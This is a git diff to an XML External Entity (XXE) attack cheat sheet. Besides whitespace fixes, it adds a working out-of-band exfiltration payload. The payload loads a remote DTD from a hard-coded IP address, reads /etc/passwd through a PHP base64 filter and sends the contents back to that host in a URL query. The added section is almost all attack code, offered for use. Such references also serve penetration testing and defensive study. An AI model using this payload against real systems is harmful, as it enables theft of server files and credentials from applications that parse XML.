@@ -1,5 +1,5 @@
 # XML External Entity
-An XML External Entity attack is a type of attack against an application that parses XML input	
+An XML External Entity attack is a type of attack against an application that parses XML input
 
 ## Exploit
 
@@ -39,7 +39,7 @@ PHP Wrapper inside XXE
     <zipcode>75000</zipcode>
     <city>Paris</city>
   </contact>
-</contacts> 
+</contacts>
 ```
 
 
@@ -80,6 +80,21 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 %all;
 ```
 
+XXE OOB with DTD and PHP filter
+```
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+File stored on http://92.222.81.2/dtd.xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">
+```
 
 ## Thanks to
 * https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
